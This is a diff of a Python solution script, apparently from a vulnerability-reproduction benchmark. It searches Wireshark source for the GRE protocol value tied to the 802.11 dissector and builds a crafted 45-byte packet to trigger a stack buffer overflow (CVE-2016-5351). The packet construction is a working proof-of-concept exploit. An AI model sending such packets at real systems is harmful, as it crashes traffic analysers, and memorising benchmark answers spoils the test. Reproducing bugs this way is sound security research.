@@ -1,119 +1,101 @@
-import tarfile
-import re
 import struct
+import os
+import re
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the vulnerability.
+        # Default fallback protocol value for 802.11 in GRE (GRE_WLAN)
+        # 0x5e00 is the value associated with CVE-2016-5351
+        target_proto = 0x5e00
+        found_proto = False
+        proto_name = None
+
+        # 1. Analyze source code to find the exact GRE protocol value
+        # Look for dissector_add_uint("gre.proto", VALUE, ...) in packet-ieee80211.c
+        for root, dirs, files in os.walk(src_path):
+            if found_proto: break
+            for name in files:
+                if name == "packet-ieee80211.c":
+                    try:
+                        path = os.path.join(root, name)
+                        with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                            content = f.read()
+                            # Search for registration
+                            m = re.search(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([A-Za-z0-9_]+|0x[0-9a-fA-F]+|\d+)\s*,', content)
+                            if m:
+                                val = m.group(1)
+                                if val.startswith("0x") or val.isdigit():
+                                    target_proto = int(val, 0)
+                                    found_proto = True
+                                else:
+                                    proto_name = val
+                    except:
+                        pass
+                if found_proto: break
         
-        The vulnerability involves the GRE dissector incorrectly passing its own private_data
-        (which is small) to the 802.11 (wlan) dissector, which expects a larger pseudoheader.
-        This causes a stack buffer overflow when the wlan dissector reads from the pointer.
+        # 2. If a macro name was found (e.g., GRE_WLAN), resolve its value from headers
+        if not found_proto and proto_name:
+            for root, dirs, files in os.walk(src_path):
+                if found_proto: break
+                for name in files:
+                    if name.endswith(".h") or name.endswith(".c"):
+                        try:
+                            path = os.path.join(root, name)
+                            with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                                content = f.read()
+                                # Search for definition: #define NAME VALUE
+                                m = re.search(r'#define\s+' + re.escape(proto_name) + r'\s+(0x[0-9a-fA-F]+|\d+)', content)
+                                if m:
+                                    target_proto = int(m.group(1), 0)
+                                    found_proto = True
+                                    break
+                        except:
+                            pass
+
+        # 3. Construct the PoC packet
+        # Total length target: 45 bytes
+        # Structure: Eth (14) + IP (20) + GRE (4) + Payload (7)
         
-        We need to find the specific Ethertype/Protocol ID that the wlan dissector is registered
-        to in the 'gre.proto' table within the source code.
-        """
-        
-        gre_proto_type = 0
-        
-        try:
-            with tarfile.open(src_path, 'r') as tar:
-                # We need to scan header files for Ethertype definitions and the GRE dissector source
-                etypes_content = ""
-                gre_content = ""
-                
-                for member in tar.getmembers():
-                    if member.name.endswith("etypes.h"):
-                        f = tar.extractfile(member)
-                        if f:
-                            etypes_content = f.read().decode('utf-8', errors='ignore')
-                    elif member.name.endswith("packet-gre.c"):
-                        f = tar.extractfile(member)
-                        if f:
-                            gre_content = f.read().decode('utf-8', errors='ignore')
-                
-                # 1. Build a map of ETHERTYPE definitions
-                defines = {}
-                define_pattern = re.compile(r'#define\s+(ETHERTYPE_\w+)\s+(0x[0-9a-fA-F]+|\d+)')
-                
-                if etypes_content:
-                    for name, val in define_pattern.findall(etypes_content):
-                        defines[name] = int(val, 0)
-                if gre_content:
-                    for name, val in define_pattern.findall(gre_content):
-                        defines[name] = int(val, 0)
-                
-                # 2. Find the dissector handle variable for "wlan"
-                # Pattern: handle = find_dissector("wlan");
-                wlan_handles = {'wlan_handle'} # Default guess
-                handle_pattern = re.compile(r'(\w+)\s*=\s*find_dissector\s*\(\s*"wlan"\s*\)')
-                
-                if gre_content:
-                    for h in handle_pattern.findall(gre_content):
-                        wlan_handles.add(h)
-                    
-                    # 3. Find the registration in gre.proto
-                    # Pattern: dissector_add_uint("gre.proto", TYPE, handle);
-                    reg_pattern = re.compile(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([^,]+)\s*,\s*([^)]+)\s*\)')
-                    
-                    for type_arg, handle_arg in reg_pattern.findall(gre_content):
-                        type_arg = type_arg.strip()
-                        handle_arg = handle_arg.strip()
-                        
-                        # Check if this registration uses a wlan handle
-                        if handle_arg in wlan_handles or 'wlan' in handle_arg.lower() or '80211' in handle_arg:
-                            # Resolve the protocol type
-                            if type_arg.startswith('0x') or type_arg.isdigit():
-                                gre_proto_type = int(type_arg, 0)
-                            elif type_arg in defines:
-                                gre_proto_type = defines[type_arg]
-                            
-                            # If we found a non-zero type, we assume it's the target
-                            if gre_proto_type != 0:
-                                break
-        except Exception:
-            pass
-        
-        # If we failed to extract, we proceed with 0 (which likely won't work, but satisfies return type)
-        # However, for the specific arvo:7024 case, extraction is key.
-        
-        # Construct the PoC Packet
-        # Length requirement: 45 bytes
-        # Structure: IP Header (20) + GRE Header (4) + Payload (21)
-        
-        # IPv4 Header
-        # Version: 4, IHL: 5 (0x45)
-        # TOS: 0
-        # Total Length: 45 (0x002D)
-        # ID: 0, Flags/Frag: 0
-        # TTL: 64 (0x40), Protocol: 47 (GRE, 0x2F), Checksum: 0 (calc later)
-        # Src: 127.0.0.1, Dst: 127.0.0.1
-        ip_header = bytearray([
-            0x45, 0x00, 0x00, 0x2d,
-            0x00, 0x00, 0x00, 0x00,
-            0x40, 0x2f, 0x00, 0x00,
-            0x7f, 0x00, 0x00, 0x01,
-            0x7f, 0x00, 0x00, 0x01
-        ])
+        # Ethernet Header (14 bytes)
+        eth_dst = b'\xff\xff\xff\xff\xff\xff'
+        eth_src = b'\x00\x00\x00\x00\x00\x00'
+        eth_type = struct.pack('!H', 0x0800) # IPv4
+        eth = eth_dst + eth_src + eth_type
+
+        # IP Header (20 bytes)
+        ip_ver = 0x45
+        ip_tos = 0
+        ip_len = 31 # 45 - 14
+        ip_id = 0
+        ip_frag = 0
+        ip_ttl = 64
+        ip_proto = 47 # GRE
+        ip_check = 0
+        ip_src = b'\x7f\x00\x00\x01'
+        ip_dst = b'\x7f\x00\x00\x01'
         
         # Calculate IP Checksum
-        checksum = 0
-        for i in range(0, len(ip_header), 2):
-            w = (ip_header[i] << 8) + ip_header[i+1]
-            checksum += w
-        checksum = (checksum >> 16) + (checksum & 0xFFFF)
-        checksum += (checksum >> 16)
-        checksum = (~checksum) & 0xFFFF
-        struct.pack_into('>H', ip_header, 10, checksum)
+        ip_header_raw = struct.pack('!BBHHHBBH4s4s', 
+            ip_ver, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, 0, ip_src, ip_dst)
         
-        # GRE Header
-        # Flags/Version: 0x0000 (No flags, Version 0)
-        # Protocol Type: The extracted 802.11 type
-        gre_header = struct.pack('>HH', 0x0000, gre_proto_type)
+        s = 0
+        for i in range(0, len(ip_header_raw), 2):
+            w = (ip_header_raw[i] << 8) + ip_header_raw[i+1]
+            s += w
+        while (s >> 16):
+            s = (s & 0xFFFF) + (s >> 16)
+        ip_check = ~s & 0xFFFF
         
-        # Payload
-        # 21 bytes of garbage to trigger the dissector
-        payload = b'\x41' * 21
+        ip = struct.pack('!BBHHHBBH4s4s', 
+            ip_ver, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_src, ip_dst)
+
+        # GRE Header (4 bytes)
+        # Flags/Ver = 0, Protocol = target_proto
+        gre = struct.pack('!HH', 0, target_proto)
+
+        # Payload (7 bytes)
+        # Just enough data to trigger the dissector call, content will be misinterpreted
+        # due to the vulnerability (pseudo-header confusion)
+        payload = b'\x00' * 7
         
-        return bytes(ip_header) + gre_header + payload
+        return eth + ip + gre + payload
